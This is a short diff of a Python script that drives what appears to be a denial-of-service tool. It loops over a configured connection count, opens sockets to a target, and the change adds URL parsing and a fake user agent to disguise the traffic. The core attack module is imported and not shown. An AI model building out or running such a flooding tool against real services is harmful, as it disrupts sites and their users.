@@ -3,12 +3,15 @@
 import socket
 from parser import Parser as p
 from attack import start_attack
+from store import store_data
+from urllib.parse import urlparse
 
-def attack():
+
+def attack(m):
     for _ in range(int(result["connection_count"])):
         try:
-            s = a.initialize_socket()
-            a.perform_attack(s, result["connection_count"])
+            s = a.initialize_socket(m)
+            a.perform_attack(s, result["connection_count"], m)
         except socket.error as e:
             logging.debug(e)
             break
@@ -19,7 +22,13 @@ def attack():
 if __name__ == '__main__':
     result = []
     result = p.parse_arguments()
-    a = start_attack(result["host"], result["port"])
-    attack()
+    a = start_attack()
+    m = a.form_url(result["url"])
+    m.create_fake_useragent()
+    m.prepare_for_sending()
+    attack(m)
+
+
+
 
 
